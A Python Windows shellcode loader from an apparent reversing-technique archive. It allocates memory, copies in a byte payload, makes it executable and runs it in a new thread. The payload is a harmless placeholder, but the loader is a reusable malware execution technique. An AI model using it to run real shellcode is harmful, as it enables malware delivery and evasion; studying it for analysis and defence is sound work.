#
#   Shellcode Loader
#   Archive of Reversing.ID
#
#   storing payload in stack
#
# Run:
#   $ code.py
#
# Technique:
#   - allocation:   VirtualAlloc
#   - writing:      RtlMoveMemory
#   - permission:   VirtualProtect
#   - execution:    CreateThread

import ctypes

# Definition
MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
MEM_FREE    = 0x10000

PAGE_READONLY           = 0x2
PAGE_READWRITE          = 0x4
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40

fnVirtualAlloc          = ctypes.windll.kernel32.VirtualAlloc
fnVirtualProtect        = ctypes.windll.kernel32.VirtualProtect
fnRtlMoveMemory         = ctypes.windll.kernel32.RtlMoveMemory
fnCreateThread          = ctypes.windll.kernel32.CreateThread
fnWaitForSingleObject   = ctypes.windll.kernel32.WaitForSingleObject

fnVirtualAlloc.restype = ctypes.c_void_p
fnRtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

def main():
    old_protect = ctypes.c_uint32()

    # shellcode storage in stack
    payload = bytearray(b"\x90\x90\xCC\xC3")
    buffer  = (ctypes.c_char * len(payload)).from_buffer(payload)

    # allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fnVirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(payload)),
        ctypes.c_int(MEM_COMMIT | MEM_RESERVE),
        ctypes.c_int(PAGE_READWRITE))

    # copy payload to the buffer
    fnRtlMoveMemory (ctypes.c_void_p(runtime), buffer, ctypes.c_size_t(len(payload)))

    # make buffer executable (R-X)
    fnVirtualProtect (ctypes.c_void_p(runtime), ctypes.c_size_t(len(payload)), PAGE_EXECUTE_READ, ctypes.byref(old_protect))

    # execute
    th_shellcode = fnCreateThread (
        None,
        ctypes.c_int(0),
        ctypes.c_void_p(runtime),
        None,
        ctypes.c_int(0),
        None)

    fnWaitForSingleObject(ctypes.c_int(th_shellcode), ctypes.c_int(-1))

if __name__ == '__main__':
    main()